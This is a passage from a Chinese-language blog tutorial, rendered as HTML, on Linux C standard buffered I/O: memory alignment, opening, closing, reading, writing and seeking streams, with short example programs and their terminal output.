610F;&#x601D;&#x5C31;&#x662F;&#x5982;&#x679C;&#x8DE8;&#x8D8A;&#x5757;&#x8FDB;&#x884C;&#x8BFB;&#x5199;&#x4F1A;&#x5BFC;&#x81F4;&#x6548;&#x7387;&#x964D;&#x4F4E;&#xFF0C;&#x56E0;&#x6B64;&#x8BFB;&#x5199;&#x8BF7;&#x6C42;&#x82E5;&#x9009;&#x62E9;&#x5757;&#x5927;&#x5C0F;&#x7684;&#x6574;&#x6570;&#x500D;&#x548C;&#x7EA6;&#x6570;&#x500D;&#x7684;&#x8BDD;&#xFF0C;&#x5C31;&#x80FD;&#x591F;&#x4FDD;&#x8BC1;&#x4E0D;&#x4F1A;&#x51FA;&#x73B0;&#x8DE8;&#x8D8A;&#x5757;&#x8FDB;&#x884C;&#x8BFB;&#x5199;&#x7684;&#x95EE;&#x9898;&#x3002;</li><li>&#x5185;&#x5B58;&#xFF0C;&#x5E38;&#x542C;&#x5230;&#x7684;&#x5185;&#x5B58;&#x5BF9;&#x9F50;&#x95EE;&#x9898;&#x3002;CPU&#x8FDB;&#x884C;&#x8BFB;&#x5199;&#x6570;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5BF9;&#x4E8E;32&#x4F4D;&#x7684;&#x673A;&#x5668;&#xFF0C;&#x4E00;&#x6B21;&#x8BFB;&#x53D6;&#x5199;&#x5165;4&#x5B57;&#x8282;&#xFF0C;&#x5E76;&#x4E14;&#x662F;&#x6309;&#x7167;&#x8D77;&#x59CB;&#x5730;&#x5740;&#x5F00;&#x59CB;&#x7684;&#xFF0C;&#x4F8B;&#x5982;CPU&#x8981;&#x8BFB;&#x53D6;&#x4E00;&#x4E2A;&#x503C;&#x65F6;&#xFF0C;&#x5B83;&#x53EA;&#x4F1A;&#x4ECE;4&#x7684;&#x500D;&#x6570;&#x7684;&#x5730;&#x5740;&#x8FDB;&#x884C;&#x8BFB;&#x5199;&#xFF0C;&#x53EA;&#x4F1A;&#x8BFB;&#x53D6;0&#xFF0C;4&#xFF0C;8&#x8FD9;&#x4E9B;&#x5730;&#x5740;&#xFF08;&#x8D77;&#x59CB;&#x5730;&#x5740;&#x4E3A;0&#xFF09;&#x3002;&#x56E0;&#x6B64;&#x5185;&#x5B58;&#x5BF9;&#x9F50;&#x7684;&#x597D;&#x5904;&#x662F;&#xFF0C;&#x5047;&#x8BBE;&#x6211;&#x4EEC;&#x8981;&#x8BFB;&#x4E00;&#x4E2A;4&#x5B57;&#x8282;&#x7684;&#x503C;&#xFF0C;&#x5730;&#x5740;&#x5728;0x5&#xFF0C;&#x90A3;&#x4E48;CPU&#x5C31;&#x8981;&#x5148;&#x8BFB;0x4&#xFF0C;&#x53D6;&#x51FA;3&#x5B57;&#x8282;&#xFF1B;&#x7136;&#x540E;&#x518D;&#x8BFB;0x8&#xFF0C;&#x53D6;&#x51FA;1&#x5B57;&#x8282;&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;&#x8FDB;&#x884C;&#x4E86;&#x4E24;&#x6B21;&#x64CD;&#x4F5C;&#xFF0C;&#x4E25;&#x91CD;&#x5F71;&#x54CD;&#x6548;&#x7387;&#xFF1B;&#x5BF9;&#x9F50;&#x7684;&#x8BDD;&#xFF0C;&#x5C31;&#x80FD;&#x591F;&#x4FDD;&#x8BC1;&#x4E0D;&#x4F1A;&#x4EA7;&#x751F;&#x591A;&#x4F59;&#x7684;&#x64CD;&#x4F5C;&#x3002;</li></ol><p>&#x800C;C&#x7684;&#x63A5;&#x53E3;&#x9ED8;&#x8BA4;&#x4F18;&#x5316;&#x4E86;&#x8FD9;&#x4E9B;&#x95EE;&#x9898;&#xFF0C;&#x5185;&#x5B58;&#x5BF9;&#x9F50;&#x4E00;&#x822C;&#x7F16;&#x8BD1;&#x5668;&#x4F1A;&#x4F18;&#x5316;&#x597D;&#x3002;<br>** &#x5176;&#x4ED6; **&#xFF1A;<br>&#x5206;&#x533A;&#x5BF9;&#x9F50;&#xFF1A;&#x5C06;&#x5206;&#x533A;&#x7684;&#x8D77;&#x59CB;&#x4F4D;&#x7F6E;&#x653E;&#x5728;&#x6247;&#x533A;&#x7684;0&#x5904;&#xFF0C;&#x8FD9;&#x6837;&#x624D;&#x80FD;&#x4FDD;&#x8BC1;&#x6BCF;&#x4E00;&#x4E2A;block&#x90FD;&#x5728;&#x5355;&#x72EC;&#x7684;&#x4E00;&#x4E2A;&#x6247;&#x533A;&#x4E2D;&#xFF0C;&#x4E00;&#x4E2A;&#x6247;&#x533A;&#x4E2D;&#x5305;&#x542B;&#x591A;&#x4E2A;block&#xFF0C;&#x82E5;&#x4E0D;&#x5BF9;&#x9F50;&#xFF0C;&#x90A3;&#x4E48;&#x5C06;&#x4F1A;&#x5BFC;&#x81F4;&#x4E00;&#x4E2A;block&#x8DE8;&#x8D8A;&#x4E24;&#x4E2A;&#x6247;&#x533A;&#xFF0C;&#x4E25;&#x91CD;&#x5F71;&#x54CD;&#x901F;&#x5EA6;&#x3002;</p><h3 id="&#x7528;&#x6237;&#x7F13;&#x51B2;I-O"><a href="#&#x7528;&#x6237;&#x7F13;&#x51B2;I-O" class="headerlink" title="&#x7528;&#x6237;&#x7F13;&#x51B2;I/O"></a>&#x7528;&#x6237;&#x7F13;&#x51B2;I/O</h3><p>&#x7528;&#x6237;&#x7F13;&#x51B2;I/O&#x7684;&#x4F5C;&#x7528;&#x7C7B;&#x4F3C;&#x4E8E;&#x5185;&#x6838;&#x7684;&#x7F13;&#x51B2;&#x533A;&#xFF0C;&#x5728;&#x7528;&#x6237;&#x7A7A;&#x95F4;&#x8BBE;&#x7F6E;&#x8F93;&#x5165;&#x8F93;&#x51FA;&#x7684;&#x7F13;&#x51B2;&#x533A;&#xFF0C;&#x76EE;&#x7684;&#x4E5F;&#x662F;&#x4E3A;&#x4E86;&#x63D0;&#x4F9B;I/O&#x6548;&#x7387;&#x3002;<br>&#x6807;&#x51C6;I/O&#x4E0D;&#x540C;&#x4E8E;&#x7CFB;&#x7EDF;I/O&#xFF0C;&#x5B83;&#x4F7F;&#x7528;&#x7684;&#x4E0D;&#x662F;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x64CD;&#x4F5C;&#xFF0C;&#x800C;&#x662F;&#x6587;&#x4EF6;&#x6307;&#x9488;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x201D;&#x6D41;&#x201D;&#xFF0C;&#x6700;&#x5E38;&#x89C1;&#x7684;&#x662F;&#x6807;&#x51C6;&#x8F93;&#x5165;&#x8F93;&#x51FA;&#x6D41;&#xFF0C;stdin&#x548C;stdout&#xFF0C;&#x5BF9;&#x5E94;&#x4E8E;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;0&#x548C;1&#x3002;</p><h3 id="&#x6253;&#x5F00;&#x6587;&#x4EF6;"><a href="#&#x6253;&#x5F00;&#x6587;&#x4EF6;" class="headerlink" title="&#x6253;&#x5F00;&#x6587;&#x4EF6;"></a>&#x6253;&#x5F00;&#x6587;&#x4EF6;</h3><p>&#x8FD4;&#x56DE;&#x7684;&#x662F;&#x6587;&#x4EF6;&#x6307;&#x9488;&#xFF0C;&#x4E5F;&#x5C31;&#x662F; &#x201C;&#x6D41;&#x201D;&#xFF0C;&#x4E0B;&#x9762;&#x7684;&#x63A5;&#x53E3;&#x4E5F;&#x662F;&#x6700;&#x5E38;&#x7528;&#xFF1A;<br></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-function">FILE* <span class="hljs-title">fopen</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> * path, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> * mode)</span></span>;</span><br></pre></td></tr></tbody></table></figure><br>&#x56E0;&#x4E3A;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x548C;&#x6D41;&#x662F;&#x5BF9;&#x5E94;&#x7684;&#xFF0C;&#x56E0;&#x6B64;&#x4E5F;&#x53EF;&#x4EE5;&#x7531;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x8F6C;&#x5316;&#x4E3A; &#x6D41;&#xFF1A;<br><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-function">FILE * <span class="hljs-title">fdopen</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *mode)</span></span>;</span><br></pre></td></tr></tbody></table></figure><br>&#x4E24;&#x8005;&#x5C06;&#x4F1A;&#x5173;&#x8054;&#xFF0C;&#x901A;&#x8FC7;&#x4E00;&#x4E2A;&#x4FEE;&#x6539;&#x5C31;&#x4F1A;&#x5F71;&#x54CD;&#x53E6;&#x4E00;&#x4E2A;&#x7684;&#x64CD;&#x4F5C;&#x3002;&#x6A21;&#x5F0F;&#x5FC5;&#x987B;&#x5339;&#x914D;&#x3002;<p></p><h3 id="&#x5173;&#x95ED;&#x6D41;"><a href="#&#x5173;&#x95ED;&#x6D41;" class="headerlink" title="&#x5173;&#x95ED;&#x6D41;"></a>&#x5173;&#x95ED;&#x6D41;</h3><p>&#x6700;&#x5E38;&#x7528;&#x7684;&#x5C31;&#x662F;fclose&#x4E86;&#xFF1A;<br></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fclose</span> <span class="hljs-params">(FILE *stream)</span></span>;</span><br></pre></td></tr></tbody></table></figure><br>&#x5173;&#x95ED;&#x6240;&#x6709;&#x548C;&#x5F53;&#x524D;&#x8FDB;&#x7A0B;&#x76F8;&#x5173;&#x7684;&#x6D41;&#x63A5;&#x53E3;&#xFF1A;<br><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fcloseall</span> <span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;</span><br></pre></td></tr></tbody></table></figure><br>&#x8BE5;&#x51FD;&#x6570;&#x662F;Linux&#x7279;&#x6709;&#x7684;&#x3002;<p></p><h3 id="&#x4ECE;&#x6D41;&#x4E2D;&#x8BFB;&#x53D6;&#x6570;&#x636E;"><a href="#&#x4ECE;&#x6D41;&#x4E2D;&#x8BFB;&#x53D6;&#x6570;&#x636E;" class="headerlink" title="&#x4ECE;&#x6D41;&#x4E2D;&#x8BFB;&#x53D6;&#x6570;&#x636E;"></a>&#x4ECE;&#x6D41;&#x4E2D;&#x8BFB;&#x53D6;&#x6570;&#x636E;</h3><h4 id="&#x5355;&#x5B57;&#x8282;&#x8BFB;&#x53D6;"><a href="#&#x5355;&#x5B57;&#x8282;&#x8BFB;&#x53D6;" class="headerlink" title="&#x5355;&#x5B57;&#x8282;&#x8BFB;&#x53D6;"></a>&#x5355;&#x5B57;&#x8282;&#x8BFB;&#x53D6;</h4><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fgetc</span> <span class="hljs-params">(FILE *stream)</span></span>;</span><br></pre></td></tr></tbody></table></figure><br>&#x4ECE;&#x6D41;&#x4E2D;&#x8BFB;&#x53D6;&#x4E0B;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#xFF0C;&#x5E76;&#x5C06;&#x8BE5;&#x65E0;&#x7B26;&#x53F7;&#x5B57;&#x7B26;&#x5F3A;&#x8F6C;&#x4E3A;int&#x8FD4;&#x56DE;&#x3002;<p></p><h4 id="&#x5C06;&#x5B57;&#x7B26;&#x653E;&#x5728;&#x6D41;&#x4E2D;"><a href="#&#x5C06;&#x5B57;&#x7B26;&#x653E;&#x5728;&#x6D41;&#x4E2D;" class="headerlink" title="&#x5C06;&#x5B57;&#x7B26;&#x653E;&#x5728;&#x6D41;&#x4E2D;"></a>&#x5C06;&#x5B57;&#x7B26;&#x653E;&#x5728;&#x6D41;&#x4E2D;</h4><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">ungetc</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> c, FILE *stream)</span></span>;</span><br></pre></td></tr></tbody></table></figure><br>&#x7C7B;&#x4F3C;&#x4E8E;&#x4E00;&#x4E2A;&#x6808;&#xFF0C;&#x540E;&#x653E;&#x5165;&#x5148;&#x88AB;&#x8BFB;&#x51FA;&#xFF0C;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4F8B;&#x5B50;&#x80FD;&#x591F;&#x5F88;&#x597D;&#x7684;&#x8868;&#x793A;&#xFF1A;<br><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment">http://c.biancheng.net/cpp/html/269.html</span></span><br><span class="line"><span class="hljs-comment">*/</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line"><span class="hljs-keyword">char</span> c ;</span><br><span class="line"><span class="hljs-keyword">while</span>( (c = getchar()) != EOF &amp;&amp; <span class="hljs-built_in">isdigit</span>(c) )</span><br><span class="line">{</span><br><span class="line"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c &quot;</span>, c) ;</span><br><span class="line">} </span><br><span class="line">ungetc(c, <span class="hljs-built_in">stdin</span>) ;</span><br><span class="line">ungetc(<span class="hljs-string">&apos;c&apos;</span>, <span class="hljs-built_in">stdin</span>) ;</span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c \n&quot;</span>, getchar()) ;</span><br><span class="line"><span class="hljs-keyword">return</span> <span class="hljs-number">0</span> ;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><br><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">icepng@ubuntu:~$ ./<span class="hljs-built_in">test</span> </span><br><span class="line">12345qwe</span><br><span class="line">1 2 3 4 5 c</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="&#x6309;&#x884C;&#x8BFB;&#x53D6;"><a href="#&#x6309;&#x884C;&#x8BFB;&#x53D6;" class="headerlink" title="&#x6309;&#x884C;&#x8BFB;&#x53D6;"></a>&#x6309;&#x884C;&#x8BFB;&#x53D6;</h4><p>&#x8BFB;&#x53D6;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;<br></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">char</span> * <span class="hljs-title">fgets</span> <span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">int</span> <span class="hljs-built_in">size</span>, FILE *stream)</span></span>;</span><br></pre></td></tr></tbody></table></figure><br>&#x4ECE;&#x6D41;&#x4E2D;&#x6700;&#x591A;&#x8BFB;&#x53D6;size-1&#x4E2A;&#x5B57;&#x8282;&#xFF0C;&#x5E76;&#x5B58;&#x5165;str&#x4E2D;&#x3002;&#x5F53;&#x6240;&#x6709;&#x5B57;&#x8282;&#x8BFB;&#x5165;&#x65F6;&#xFF0C;&#x7A7A;&#x5B57;&#x7B26;&#x4F1A;&#x88AB;&#x5B58;&#x5165;&#x5B57;&#x7B26;&#x4E32;&#x672B;&#x5C3E;&#x3002;&#x5F53;&#x8BFB;&#x5230;EOF&#x6216;&#x6362;&#x884C;&#x7B26;&#x65F6;&#x8BFB;&#x5165;&#x7ED3;&#x675F;&#xFF0C;&#x82E5;&#x8BFB;&#x5230;&#x4E00;&#x4E2A;&#x6362;&#x884C;&#x7B26;&#xFF0C;&#x5219;&#x5C06;&#x201D;\n&#x201D;&#x5B58;&#x5165;&#x3002;<br>&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x4F1A;&#x653E;&#x5165;&#x2019;\0&#x2019;&#x3002;&#x4F8B;&#x5982;&#xFF1A;<br><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line"><span class="hljs-keyword">char</span> c[<span class="hljs-number">10</span>] ;</span><br><span class="line"></span><br><span class="line">fgets(c, <span class="hljs-number">10</span>, <span class="hljs-built_in">stdin</span>) ;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span>( c[<span class="hljs-number">5</span>] == <span class="hljs-string">&apos;\0&apos;</span> ) <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;yes&quot;</span>)  ;</span><br><span class="line"><span class="hljs-keyword">return</span> <span class="hljs-number">0</span> ;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><br><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">icepng@ubuntu:~$ ./<span class="hljs-built_in">test</span> </span><br><span class="line">1234</span><br><span class="line">yes</span><br></pre></td></tr></tbody></table></figure><br>&#x53EF;&#x4EE5;&#x5F97;&#x77E5;&#xFF0C;c[0-3]&#x5B58;&#x5165;1-4&#xFF0C;c[4]&#x5B58;&#x5165;&#x2019;\n&#x2019;&#xFF0C;c[5]&#x5B58;&#x5165;&#x2019;\0&#x2019;&#x3002;<p></p><h4 id="&#x8BFB;&#x53D6;&#x4E8C;&#x8FDB;&#x5236;&#x6587;&#x4EF6;"><a href="#&#x8BFB;&#x53D6;&#x4E8C;&#x8FDB;&#x5236;&#x6587;&#x4EF6;" class="headerlink" title="&#x8BFB;&#x53D6;&#x4E8C;&#x8FDB;&#x5236;&#x6587;&#x4EF6;"></a>&#x8BFB;&#x53D6;&#x4E8C;&#x8FDB;&#x5236;&#x6587;&#x4EF6;</h4><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">size_t</span> <span class="hljs-title">fread</span> <span class="hljs-params">(<span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">size_t</span> <span class="hljs-built_in">size</span>, <span class="hljs-keyword">size_t</span> nr, FILE *stream)</span></span>;</span><br></pre></td></tr></tbody></table></figure><br>&#x4ECE;&#x6D41;&#x4E2D;&#x8BFB;&#x5165; nr&#x4E2A;&#x6570;&#x636E;&#xFF0C;&#x6BCF;&#x4E2A;&#x6570;&#x636E;size&#x4E2A;&#x5B57;&#x8282;&#x3002;&#x8FD4;&#x56DE;&#x8BFB;&#x5165;&#x5143;&#x7D20;&#x7684;&#x4E2A;&#x6570;&#x3002;<p></p><h3 id="&#x5411;&#x6D41;&#x4E2D;&#x5199;&#x6570;&#x636E;"><a href="#&#x5411;&#x6D41;&#x4E2D;&#x5199;&#x6570;&#x636E;" class="headerlink" title="&#x5411;&#x6D41;&#x4E2D;&#x5199;&#x6570;&#x636E;"></a>&#x5411;&#x6D41;&#x4E2D;&#x5199;&#x6570;&#x636E;</h3><p>&#x548C;&#x8BFB;&#x5BF9;&#x5E94;&#x7684;&#x4E00;&#x4E9B;&#x63A5;&#x53E3;</p><h4 id="&#x5199;&#x5165;&#x5355;&#x4E2A;&#x5B57;&#x7B26;"><a href="#&#x5199;&#x5165;&#x5355;&#x4E2A;&#x5B57;&#x7B26;" class="headerlink" title="&#x5199;&#x5165;&#x5355;&#x4E2A;&#x5B57;&#x7B26;"></a>&#x5199;&#x5165;&#x5355;&#x4E2A;&#x5B57;&#x7B26;</h4><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fputc</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> c, FILE *stream)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="&#x5199;&#x5165;&#x5B57;&#x7B26;&#x4E32;"><a href="#&#x5199;&#x5165;&#x5B57;&#x7B26;&#x4E32;" class="headerlink" title="&#x5199;&#x5165;&#x5B57;&#x7B26;&#x4E32;"></a>&#x5199;&#x5165;&#x5B57;&#x7B26;&#x4E32;</h4><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fputs</span> <span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *str, FILE *stream)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="&#x5199;&#x5165;&#x4E8C;&#x8FDB;&#x5236;&#x6570;&#x636E;"><a href="#&#x5199;&#x5165;&#x4E8C;&#x8FDB;&#x5236;&#x6570;&#x636E;" class="headerlink" title="&#x5199;&#x5165;&#x4E8C;&#x8FDB;&#x5236;&#x6570;&#x636E;"></a>&#x5199;&#x5165;&#x4E8C;&#x8FDB;&#x5236;&#x6570;&#x636E;</h4><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">size_t</span> <span class="hljs-title">fwrite</span> <span class="hljs-params">(<span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">size_t</span> <span class="hljs-built_in">size</span>, <span class="hljs-keyword">size_t</span> nr, FILE *stream)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="&#x5B9A;&#x4F4D;&#x6D41;"><a href="#&#x5B9A;&#x4F4D;&#x6D41;" class="headerlink" title="&#x5B9A;&#x4F4D;&#x6D41;"></a>&#x5B9A;&#x4F4D;&#x6D41;</h3><p>&#x76EE;&#x7684;&#x662F;&#x7528;&#x4E8E;&#x6307;&#x5B9A;&#x4F4D;&#x7F6E;&#x8BFB;&#x5199;<br></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fseek</span> <span class="hljs-params">(FILE *stream, <span class="hljs-keyword">long</span> offset, <span class="hljs-keyword">int</span> whence)</span></span>;</span><br></pre></td></tr></tbody></table></figure><br>&#x7C7B;&#x4F3C;&#x4E8E;&#x7CFB;&#x7EDF;I/O&#x4E2D;&#x7684;lseek&#xFF0C;&#x504F;&#x79FB;&#x4E5F;&#x662F;&#x7531;whence&#x548C;offset&#x5171;&#x540C;&#x51B3;&#x5B9A;&#x7684;&#x3002;&#x6210;&#x529F;&#x8FD4;&#x56DE;0&#xFF0C;&#x5931;&#x8D25;&#x8FD4;&#x56DE;-1&#x3002;<br>fsetpos&#x51FD;&#x6570;&#x5219;&#x7528;&#x4E8E;&#x76F4;&#x63A5;&#x5B9A;&#x4F4D;&#x5230;&#x6307;&#x5B9A;&#x4F4D;&#x7F6E;&#xFF1A;<br><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fsetpos</span> <span class="hljs-params">(FILE *stream, <span class="hljs-keyword">fpos_t</span> *pos)</span></span>;</span><br></pre></td></tr></tbody></table></figure><br>rewind&#x51FD;&#x6570;&#x7528;&#x4E8E;&#x91CD;&#x7F6E;&#x6D41;&#x5230;&#x521D;&#x59CB;&#x4F4D;&#x7F6E;&#xFF1A;<br><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">rewind</span> <span class="hljs-params">(FILE *stream)</span></span>;</span><br></pre></td></tr></tbody></table></figure><br>ftell&#x7528;&#x4E8E;&#x8FD4;&#x56DE;&#x5F53;&#x524D;&#x6D41;&#x7684;&#x4F4D;&#x7F6E;&#xFF1A;<br><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">long</span> <span class="hljs-title">ftell</span> <span class="hljs-params">(FILE *stream)</span></span>;</span><br></pre></td></tr></tbody></table></figure><br>&#x7C7B;&#x4F3C;&#x529F;&#x80FD;&#x7684;&#x63A5;&#x53E3;&#x4E3A;fgetpos&#xFF0C;&#x7528;&#x4E8E;&#x83B7;&#x53D6;&#x6D41;&#x7684;&#x5F53;&#x524D;&#x4F4D;&#x7F6E;&#xFF0C;&#x5E76;&#x5199;&#x5165;pos&#x4E2D;&#xFF1A;<br><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdioh.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fgetpos</span> <span class="hljs-params">(FILE *stream, <span class="hljs-keyword">fpos_t</span> *pos)</span></span>;</span><br></pre></td></tr></tbody></table></figure><br>&#x53C2;&#x8003;&#xFF1A;<a href="http://www.runoob.com/cprogramming/c-function-fgetpos.html" target="_blank" 